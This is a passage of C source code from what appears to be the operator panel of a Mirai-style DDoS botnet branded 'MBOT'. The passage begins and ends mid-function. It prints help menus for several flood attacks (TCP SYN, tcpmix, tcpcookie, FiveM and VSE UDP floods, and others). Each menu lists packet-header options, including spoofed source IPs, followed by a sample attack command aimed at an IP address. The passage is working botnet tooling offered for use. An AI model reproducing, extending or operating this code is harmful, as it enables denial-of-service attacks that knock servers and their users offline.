                send(fd, "\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[95mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[95murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[95mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mtos: \e[37mIP header TOS.\r\n", strlen("\e[95mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mid: \e[37mIP header ID (default random).\r\n", strlen("\e[95mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[95msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!burstcp 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!burstcp 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
                continue;
            }

            if(data == "!tcpcookie help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mtcpcookie\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mtcpcookie\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[95mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[95msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[95mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[95murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[95mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mtos: \e[37mIP header TOS.\r\n", strlen("\e[95mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mid: \e[37mIP header ID (default random).\r\n", strlen("\e[95mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[95msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!tcpcookie 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!tcpcookie 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
                continue;
            }

            if(data == "!tcpmix help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mTCPMIX\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mTCPMIX\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[95mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[95msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[95mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[95murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[95mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mtos: \e[37mIP header TOS.\r\n", strlen("\e[95mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mid: \e[37mIP header ID (default random).\r\n", strlen("\e[95mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[95msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!tcpmix 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!tcpmix 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
                continue;
            }

            if(data == "!tcpsyn help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mTCPSYN\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mTCPSYN\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[95mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[95msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[95mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[95murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[95mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mtos: \e[37mIP header TOS.\r\n", strlen("\e[95mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mid: \e[37mIP header ID (default random).\r\n", strlen("\e[95mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[95msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!tcpsyn 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!tcpsyn 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
                continue;
            }


            if(data == "!hex help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mHEX\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mHEX\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msport: \e[37mTCP header source port (default random).\r\n\r\n", strlen("\e[95msport: \e[37mTCP header source port (default random).\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!hex 77.77.77.78 \e[95mport\e[37m=80 \e[95msize\e[37m=1440\r\n", strlen("\e[37m!hex 77.77.77.78 \e[95mport\e[37m=80 \e[95msize\e[37m=1440\r\n"), MSG_NOSIGNAL);
                continue;
            }

             if(data == "!udpfivem help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mUDP-FIVEM\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mUDP-FIVEM\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[95mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mtos: \e[37mIP header TOS.\r\n", strlen("\e[95mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mid: \e[37mIP header ID (default random).\r\n\r\n", strlen("\e[95mid: \e[37mIP header ID (default random).\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!fivem 77.77.77.78 \e[95mport\e[37m=30120 \e[95msize\e[37m=540 (choose your own)\r\n", strlen("\e[37m!fivem 77.77.77.78 \e[95mport\e[37m=30120 \e[95msize\e[37m=540 (choose your own)\r\n"), MSG_NOSIGNAL);
                continue;
            }

            if(data == "!udpvse help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mudpvse\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mudpvse\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[95mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[95msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[95mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[95murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[95mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mtos: \e[37mIP header TOS.\r\n", strlen("\e[95mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mid: \e[37mIP header ID (default random).\r\n", strlen("\e[95mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[95msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!udpvse 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!udpvse 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
                continue;
            }
            if(data == "!esp help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
